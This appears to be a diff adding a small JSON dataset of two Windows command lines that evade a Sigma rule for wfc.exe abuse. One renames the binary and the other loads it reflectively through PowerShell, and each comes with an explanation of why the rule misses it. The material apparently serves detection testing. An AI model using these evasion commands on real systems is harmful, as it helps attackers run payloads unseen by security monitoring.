@@ -1,0 +1,10 @@
+[
+  {
+    "output": "copy C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\wfc.exe %TEMP%\\not_suspicious.exe && %TEMP%\\not_suspicious.exe /target:library /out:payload.dll workflow.xoml",
+    "explanation": "The Sigma rule relies on the process image ending in '\\wfc.exe' or the 'OriginalFileName' being 'wfc.exe'. By copying the binary to a different filename (e.g., 'not_suspicious.exe'), the 'Image|endswith' filter is bypassed. While some advanced EDRs track 'OriginalFileName' via PE metadata, many standard SIEM logs (like basic Windows Event ID 4688) do not capture this field, allowing the renamed execution to go undetected by this specific rule logic."
+  },
+  {
+    "output": "powershell -Command \"[System.Reflection.Assembly]::LoadFile('C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\wfc.exe').EntryPoint.Invoke($null, @(,[string[]]('/target:library', '/out:payload.dll', 'workflow.xoml')))\"",
+    "explanation": "This bypass avoids process creation for wfc.exe entirely by loading the executable as a .NET assembly directly within a PowerShell process. Since the Sigma rule specifically monitors 'process_creation' where the Image is 'wfc.exe', executing the logic in-memory or reflectively bypasses the primary detection trigger."
+  }
+]
